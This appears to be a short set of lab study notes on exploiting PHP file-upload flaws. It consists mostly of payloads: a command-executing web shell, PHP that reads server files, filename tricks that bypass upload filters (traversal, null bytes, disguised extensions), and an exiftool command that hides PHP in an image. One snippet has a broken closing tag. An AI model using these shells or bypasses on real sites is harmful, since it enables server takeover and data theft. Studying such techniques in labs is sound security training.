## PHP sites

```php
<?php echo file_get_contents('/path/to/target/file'); ?> // read files from server's filesystem
```

```php
<?php echo system($_GET['command']); ?>
```

-execute this command by `GET /example/exploit.php?command=id HTTP/1.1`

### 1. Remote code execution via web shell upload

```php
<?php echo file_get_contents('home/carlos/secret'); >
```

`GET /files/avatars/exploit.php`

### 2. Content-Type restriction bypass

- change `Content-Type: image/png` in POST request

### 3. Web shell upload via path traversal

- change the file upload path (one directory above) by
  `Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php`

### 4. Web shell upload via obfuscated file extension

- exploit.pHp
- exploit.php.jpg
- exploit%2ephp
- exploit.php%00.jpg
- exploit.asp;.jpg , exploit.asp%00.jpg
-

### 5. Web shell with polygoat

```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" your_image.png -o polygoat.php
```
